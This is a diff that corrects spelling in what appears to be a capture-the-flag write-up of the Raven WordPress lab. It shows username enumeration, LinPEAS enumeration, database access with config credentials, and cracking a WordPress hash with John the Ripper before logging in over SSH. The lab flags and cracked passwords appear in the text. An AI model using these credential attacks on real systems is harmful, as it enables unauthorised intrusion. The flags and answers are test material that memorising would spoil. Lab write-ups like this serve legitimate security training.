@@ -211,7 +211,7 @@ wpscan.txt
 Displaying wpscan.txt.
 ```
 
-  - 2 potemtial usernames were found in the wpscan being `steven` and `micheal` that we can use to attempt to gain access to the machince via ssh.
+  - 2 potential usernames were found in the wpscan being `steven` and `micheal` that we can use to attempt to gain access to the machince via ssh.
   - We will target michael first by making a quick wordlist with the [mentalist](https://github.com/sc0tfree/mentalist) of possible passwords.
   ```
   root@Kali:~# mentalist
@@ -300,7 +300,7 @@ flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
 
 
       **Method Used**
-      - With access to to micheals account [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) was downloaded to the /tmp/ direcotry for some automated enumeration for any security misconfigurations that may be of intrest.
+      - With access to to michaels account [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) was downloaded to the /tmp/ direcotry for some automated enumeration for any security misconfigurations that may be of interest.
       
 ```
 michael@target1:/tmp$ git clone https://github.com/carlospolop/PEASS-ng.git
@@ -329,7 +329,7 @@ define('DB_USER', 'root');
 define('DB_PASSWORD', 'password_here');
 define('DB_USER', 'username_here');
 ```
-- Using these creds we were able to access the mysql database
+- Using these creds we were able to access the mysql database.
 ```
 michael@target1:~$ mysql -u root -p
 Enter password: 
@@ -347,7 +347,7 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
 mysql> 
 ```
-- flag3 was found in the wordpress database and in the wp_posts table
+- flag3 was found in the wordpress database and in the wp_posts table.
 ```
 As a new WordPress user, you should go to <a href="http://192.168.206.131/wordpress/wp-admin/">your dashboard</a> to delete this page and create new pages for your content. Have fun! | Sample Page  |              | publish     | closed         | open        |               | sample-page   |         |        | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 |                       |           0 | http://192.168.206.131/wordpress/?page_id=2                      |          0 | page      |                |             0 |
 |  4 |           1 | 2018-08-13 01:48:31 | 0000-00-00 00:00:00 | flag3{afc01ab56b50591e7dccf93122770cd2} 
@@ -371,7 +371,7 @@ As a new WordPress user, you should go to <a href="http://192.168.206.131/wordpr
 |  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
 +----+------------+------------------------------------+---------------+-------------------+----------+---------------------+--------------
 ```
-- Already having access to micheals account we focued on stevens credentials.     
+- Already having access to micheals account we focused on stevens credentials.     
 
  - `steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/`
  - Figuring out the hash type may help in our attempts to crack it I will run it in hash-identifier.
@@ -397,7 +397,8 @@ Possible Hashs:
 --------------------------------------------------
 ```
 - The hash appears to be a `MD5(Wordpress)`
-- john the ripper should be able to atuomaticly dtermine the hashtype without setting the format so we will run it agaisnt the rockyou wordlist using dictoanry attack with the hopes it has appeared in a previous breach.
+- john the ripper should be able to automatically determine the hashtype without setting the format so we will run it 
+against the rockyou wordlist using dictoanry attack with the hopes it has appeared in a previous breach.
 ```
 root@Kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
 Using default input encoding: UTF-8
@@ -411,7 +412,7 @@ Use the "--show --format=phpass" options to display all of the cracked passwords
 Session completed
 ```
 - John successfully cracked the hash giving use the credentials `steven:pink84`
-- We will reley credential reuse and no private ssh key to try get us in via ssh.
+- We will rely credential reuse and no private ssh key to try get us in via ssh.
 ```
 root@Kali:~# ssh steven@192.168.1.110
 steven@192.168.1.110's password: 
